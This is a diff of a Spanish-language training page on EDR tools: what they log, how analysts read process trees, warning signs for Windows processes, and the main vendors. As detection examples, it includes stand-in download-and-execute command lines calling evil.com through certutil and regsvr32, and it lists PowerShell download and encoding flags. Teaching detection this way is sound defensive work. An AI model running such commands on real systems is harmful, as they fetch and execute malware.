@@ -4,279 +4,120 @@ icon: shield-halved
 
 # EDR — Detección y Respuesta de Endpoints
 
-### ¿Qué es un EDR?
+**EDR** (Endpoint Detection and Response) es un agente instalado en cada endpoint (PC, servidor, portátil) que monitoriza y registra en tiempo real todo lo que ocurre en el sistema: procesos, conexiones de red, operaciones de archivos, cambios de registro y más.
 
-**EDR (Endpoint Detection and Response)** es un agente de seguridad instalado en cada endpoint (PC, servidor, portátil) que monitoriza y registra en tiempo real todo lo que ocurre en el sistema: procesos, conexiones de red, operaciones de archivos, cambios de registro, y más.
-
-```
-Diferencia con el antivirus tradicional:
-
-Antivirus:
-→ Detecta malware CONOCIDO comparando con firmas (base de datos)
-→ Reactivo: solo detecta lo que ya se conoce
-→ Si el malware es nuevo (0-day) o está ofuscado → no lo detecta
-
-EDR:
-→ Monitoriza el COMPORTAMIENTO del sistema continuamente
-→ Detecta actividad anómala aunque el malware sea desconocido
-→ Registra todo para análisis forense
-→ Permite respuesta activa: aislar el endpoint, matar procesos
-→ Permite hunting: buscar IOCs en todos los endpoints a la vez
-```
+|                 | Antivirus tradicional       | EDR                                     |
+| --------------- | --------------------------- | --------------------------------------- |
+| **Detección**   | Malware conocido por firmas | Comportamiento anómalo                  |
+| **Enfoque**     | Reactivo                    | Proactivo                               |
+| **0-days**      | No detecta                  | Puede detectar por comportamiento       |
+| **Visibilidad** | Limitada al archivo         | Todo el sistema                         |
+| **Respuesta**   | Cuarentena del archivo      | Aislar endpoint, matar proceso, hunting |
 
 ### Capacidades del EDR
 
 #### Visibilidad
 
-```
 El EDR registra y hace disponible para el analista:
 
-Procesos:
-→ Cada proceso que se ejecuta: nombre, PID, ruta, argumentos
-→ Árbol de procesos (relación padre-hijo)
-→ Hash del ejecutable
-→ Usuario que lo ejecutó
-→ Línea de comandos completa
-
-Conexiones de red por proceso:
-→ Qué proceso hizo qué conexión
-→ IP y puerto origen/destino
-→ Protocolo
-→ País de destino
-
-Operaciones de archivos:
-→ Archivos creados, modificados, eliminados, renombrados
-→ Por qué proceso y desde qué ruta
-
-Modificaciones del registro (Windows):
-→ Claves creadas, modificadas o eliminadas
-→ Especialmente en rutas de persistencia (Run, Services...)
-
-Carga de DLLs:
-→ Qué librerías carga cada proceso
-→ DLL hijacking: DLL cargada desde ruta inusual
-
-Inyección de código:
-→ Detección de técnicas de inyección entre procesos
-→ Process hollowing, DLL injection, reflective injection
-```
+* **Procesos** — nombre, PID, ruta, argumentos, usuario que lo ejecutó, hash del ejecutable, línea de comandos completa
+* **Árbol de procesos** — relación padre-hijo entre procesos
+* **Conexiones de red por proceso** — qué proceso hizo qué conexión, IP/puerto origen y destino
+* **Operaciones de archivos** — archivos creados, modificados, eliminados o renombrados, y por qué proceso
+* **Modificaciones del registro** (Windows) — especialmente en rutas de persistencia
+* **Carga de DLLs** — para detectar DLL hijacking
 
 #### Respuesta activa
 
-```
-El EDR permite al analista actuar directamente desde la consola:
+Desde la consola del EDR el analista puede:
 
-Aislar el endpoint:
-→ Corta todas las conexiones de red del endpoint
-→ El equipo ya no puede comunicarse con nada (ni C2 ni red interna)
-→ Pero mantiene la conexión con el servidor del EDR
-→ El analista puede seguir investigando y dando comandos
+* **Aislar el endpoint** — corta todas las conexiones de red pero mantiene la conexión con el servidor del EDR, permitiendo seguir investigando
+* **Poner archivo en cuarentena** — el archivo malicioso se mueve a una zona segura sin posibilidad de ejecución
+* **Matar un proceso** — terminar inmediatamente un proceso malicioso en ejecución
+* **Live Response / Remote Shell** — acceso interactivo al endpoint comprometido sin estar físicamente presente
 
-Poner archivo en cuarentena:
-→ El archivo malicioso se mueve a una zona segura
-→ Ya no puede ejecutarse ni propagarse
-→ Se puede recuperar si fue un FP
+#### Hunting masivo
 
-Matar un proceso:
-→ Terminar inmediatamente un proceso malicioso en ejecución
+El EDR permite buscar un IOC en **todos los endpoints a la vez**. Si el analista detecta un C2 en un sistema, puede buscar en segundos si otros equipos también se comunicaron con esa IP — revelando posible movimiento lateral.
 
-Ejecutar script de respuesta:
-→ Correr un script en el endpoint para recopilar información
-→ O para realizar acciones de remediación
+### El árbol de procesos
 
-Live Response / Remote Shell:
-→ Acceso interactivo al endpoint comprometido
-→ Permite investigar en profundidad sin estar físicamente presente
-```
+El árbol de procesos es la visualización más importante del EDR. Muestra la jerarquía padre-hijo y es la forma más rápida de detectar comportamiento malicioso.
 
-#### Hunting (búsqueda proactiva)
+#### Árbol de procesos normal (Windows)
 
 ```
-El EDR permite buscar un IOC en TODOS los endpoints a la vez:
-
-Búsqueda de hash:
-→ "¿Algún sistema tiene este archivo malicioso?"
-→ Respuesta en segundos, para todos los endpoints de la organización
-
-Búsqueda de conexión:
-→ "¿Algún sistema se ha conectado a esta IP?"
-→ Detectar propagación del C2 a otros equipos
-
-Búsqueda de proceso:
-→ "¿Algún sistema está ejecutando este proceso con estos argumentos?"
-→ Detectar herramientas de ataque activas
-
-Ejemplo práctico:
-Analista detecta un C2 en el sistema A.
-Busca en el EDR: "¿qué otros sistemas se conectaron a esa IP?"
-→ Sistema B y C también se conectaron → movimiento lateral confirmado
-```
-
-### El árbol de procesos — cómo leerlo
-
-El árbol de procesos es la visualización más importante del EDR. Muestra la jerarquía padre-hijo de procesos y es la forma más rápida de detectar comportamiento malicioso.
-
-#### Árbol de procesos normal
-
-```
-Sistema operativo (System)
-└── smss.exe (Session Manager)
-    └── csrss.exe
+System
+└── smss.exe
     └── wininit.exe
         ├── services.exe
         │   ├── svchost.exe -k netsvcs
-        │   ├── svchost.exe -k LocalService
-        │   └── spoolsv.exe
+        │   └── svchost.exe -k LocalService
         └── lsass.exe
 
-Usuario inicia sesión:
-winlogon.exe
-└── userinit.exe
-    └── explorer.exe (escritorio del usuario)
-        ├── chrome.exe (navegador)
-        │   └── chrome.exe (renderer)
-        └── outlook.exe (correo)
+winlogon.exe → userinit.exe → explorer.exe
+                               ├── chrome.exe
+                               └── outlook.exe
 ```
 
-#### Árboles sospechosos
+#### Árboles sospechosos — ejemplos reales
+
+**Macro maliciosa en Word (phishing):**
 
 ```
-CASO 1 — Macro maliciosa en Word (phishing):
-WINWORD.EXE (usuario abrió un documento)
-└── cmd.exe              ← Word NO debería lanzar cmd.exe
-    └── powershell.exe   ← cmd NO debería lanzar PowerShell
-        └── net.exe      ← reconocimiento de la red
-→ Indicador claro de macro maliciosa ejecutando código
+WINWORD.EXE                   ← usuario abrió un documento
+└── cmd.exe                   ← Word NO debería lanzar cmd.exe
+    └── powershell.exe        ← cmd NO debería lanzar PowerShell
+        └── net.exe           ← reconocimiento de la red
+```
 
-CASO 2 — Descarga y ejecución de payload:
+**Descarga y ejecución de payload:**
+
+```
 chrome.exe
-└── cmd.exe              ← navegador NO debería lanzar cmd
+└── cmd.exe                   ← navegador NO debería lanzar cmd
     └── certutil.exe -urlcache -f http://evil.com/payload.exe
-                         ← descarga de archivo desde internet
-        └── payload.exe  ← ejecución del malware descargado
+        └── payload.exe       ← ejecución del malware descargado
+```
 
-CASO 3 — Living off the Land (LOtL) — usando herramientas del sistema:
-svchost.exe -k netsvcs
-└── powershell.exe -EncodedCommand AAAAABBBBBCCC...
-    └── regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
-                         ← carga de script COM remoto → RCE
+**PsExec — movimiento lateral:**
 
-CASO 4 — PsExec (movimiento lateral):
+```
 services.exe
-└── PSEXESVC.exe         ← servicio instalado por PsExec
-    └── cmd.exe          ← shell en el sistema remoto
-        └── whoami       ← el atacante verifica que tiene acceso
+└── PSEXESVC.exe              ← servicio instalado por PsExec
+    └── cmd.exe               ← shell en el sistema remoto
+        └── whoami            ← el atacante verifica acceso
 ```
 
-#### Procesos legítimos de Windows — señales de compromiso
+### Procesos legítimos de Windows — señales de compromiso
 
-```
-lsass.exe:
-→ Solo debe haber UNA instancia
-→ Padre: wininit.exe
-→ Ruta: C:\Windows\System32\lsass.exe
-→ ALERTA si: múltiples instancias, padre diferente, ruta diferente
-→ Los atacantes hacen dump de lsass para robar credenciales (Mimikatz)
-→ ALERTA si: otro proceso hace handle a lsass → posible credential dump
-
-svchost.exe:
-→ Múltiples instancias son NORMALES
-→ Debe tener parámetro -k [nombre_grupo]
-→ Padre: services.exe
-→ Ruta: C:\Windows\System32\svchost.exe
-→ ALERTA si: sin parámetro -k, padre diferente, ruta diferente
-→ Uno de los procesos más imitados por malware
-
-explorer.exe:
-→ Un proceso por usuario conectado
-→ Padre: userinit.exe (que termina poco después)
-→ Ruta: C:\Windows\explorer.exe
-→ ALERTA si: conexiones de red inusuales, hijo de proceso raro
-
-powershell.exe / powershell_ise.exe:
-→ En sí mismo no es malicioso — es una herramienta legítima
-→ ALERTA si:
-  → Ejecutado desde proceso inusual (Word, Excel, svchost...)
-  → Argumentos con -EncodedCommand o -Enc
-  → Argumentos con -ExecutionPolicy Bypass
-  → Descarga desde internet: DownloadString, WebClient, IEX
-  → Línea de comandos muy larga (ofuscación)
-
-cmd.exe:
-→ ALERTA si: lanzado desde Office, navegador, svchost, lsass
-→ ALERTA si: ejecuta múltiples comandos encadenados con &&, ||, ;
-```
+| Proceso          | Padre esperado | Señales de alerta                                                                                                               |
+| ---------------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------- |
+| `lsass.exe`      | `wininit.exe`  | Más de una instancia, padre diferente, ruta diferente. Los atacantes hacen dump para robar credenciales.                        |
+| `svchost.exe`    | `services.exe` | Sin parámetro `-k`, padre diferente, ruta diferente. El más imitado por malware.                                                |
+| `explorer.exe`   | `userinit.exe` | Conexiones de red inusuales, hijo de proceso raro.                                                                              |
+| `powershell.exe` | Variable       | Ejecutado desde Office/navegador/svchost, argumentos con `-EncodedCommand`, `-ExecutionPolicy Bypass`, `IEX`, `DownloadString`. |
 
 ### Cómo usa el analista el EDR en una investigación
 
-```
-Flujo típico de investigación con EDR:
-
-1. El SIEM genera alerta → analista toma posesión
-
-2. Ir al EDR y buscar el endpoint afectado
-
-3. Ver el árbol de procesos alrededor del timestamp de la alerta
-   → ¿Qué proceso generó el evento?
-   → ¿Quién lo lanzó? ¿Desde qué proceso padre?
-   → ¿Cuál es la línea de comandos exacta?
-
-4. Ver las conexiones de red del proceso
-   → ¿Se conectó a alguna IP externa?
-   → ¿La IP aparece en Threat Intelligence?
-   → ¿El proceso debería hacer conexiones de red?
-
-5. Ver las operaciones de archivos
-   → ¿Creó algún archivo ejecutable?
-   → ¿Modificó archivos del sistema?
-   → ¿Cifró archivos (ransomware)?
-
-6. Buscar el hash del ejecutable sospechoso en VirusTotal
-   → ¿Es malware conocido?
-
-7. Si es amenaza confirmada:
-   → Aislar el endpoint desde el EDR
-   → Escalar con toda la información recopilada
-```
-
-***
+1. El SIEM genera una alerta → el analista la toma y va al EDR
+2. Busca el endpoint afectado y ve el **árbol de procesos** alrededor del timestamp
+3. Identifica qué proceso generó el evento y quién lo lanzó
+4. Revisa las **conexiones de red** de ese proceso — ¿conectó a una IP externa?
+5. Revisa las **operaciones de archivos** — ¿creó ejecutables? ¿cifró archivos?
+6. Busca el **hash del ejecutable** sospechoso en VirusTotal
+7. Si es amenaza confirmada: **aislar el endpoint** desde el EDR y escalar
 
 ### Soluciones EDR principales
 
-```
-CrowdStrike Falcon:
-→ Líder del mercado
-→ Cloud-native, muy ligero en el endpoint
-→ Excelente capacidad de hunting (Falcon Query Language)
-→ Detección por IA sin firmas
-→ Muy usado en grandes empresas y SOCs maduros
+| EDR                                 | Características                                                                |
+| ----------------------------------- | ------------------------------------------------------------------------------ |
+| **CrowdStrike Falcon**              | Líder del mercado, cloud-native, excelente hunting con FQL                     |
+| **SentinelOne**                     | IA para detección autónoma, rollback automático ante ransomware                |
+| **Microsoft Defender for Endpoint** | Integrado en Windows, excelente integración con Sentinel y Azure               |
+| **Elastic EDR**                     | Open source en versión básica, integrado con Kibana                            |
+| **Wazuh**                           | 100% gratuito, agentes para Windows/Linux/macOS, integración con MITRE ATT\&CK |
 
-SentinelOne:
-→ IA para detección autónoma
-→ Rollback automático ante ransomware
-→ Muy valorado por su capacidad de respuesta autónoma
+> El **árbol de procesos** es la primera cosa que mirar en el EDR cuando se investiga un endpoint comprometido. La cadena padre → hijo revela inmediatamente si la ejecución es legítima o maliciosa.
 
-Microsoft Defender for Endpoint:
-→ Integrado en Windows 10/11 y Windows Server
-→ Plan 2 incluye hunting avanzado con KQL
-→ Integración perfecta con Microsoft Sentinel
-→ Muy común por ser parte del ecosistema Microsoft
-
-Elastic EDR (Elastic Security):
-→ Open source en versión básica
-→ Integrado con Elastic Stack (Kibana)
-→ Buena opción para aprendizaje
-
-Wazuh:
-→ 100% gratuito y open source
-→ Agentes para Windows, Linux, macOS
-→ Integración con VirusTotal y MITRE ATT&CK
-→ Ideal para laboratorios y organizaciones con presupuesto limitado
-→ Muy usado en entornos de formación
-```
-
-> El árbol de procesos es la primera cosa que mirar en el EDR cuando se investiga un endpoint comprometido. La cadena padre → hijo revela inmediatamente si la ejecución es legítima o maliciosa — un proceso de Office lanzando PowerShell es siempre sospechoso.
-
-> La función de aislamiento del endpoint del EDR es una de las herramientas de contención más potentes del SOC: en segundos se puede cortar toda comunicación de red de un sistema comprometido sin tocar físicamente el equipo, aunque esté en otra ciudad.
-
-> Un EDR solo es tan bueno como su cobertura de despliegue. Si hay endpoints sin agente (sistemas legacy, IoT, dispositivos OT) son puntos ciegos donde el malware puede operar sin ser detectado. El inventario de activos y la cobertura del EDR son una prioridad del ingeniero de seguridad SOC.
+> Un EDR solo es tan bueno como su **cobertura de despliegue**. Si hay endpoints sin agente (sistemas legacy, IoT, OT), son puntos ciegos donde el malware puede operar sin ser detectado. El inventario de activos y la cobertura del EDR son una prioridad del ingeniero de seguridad SOC.
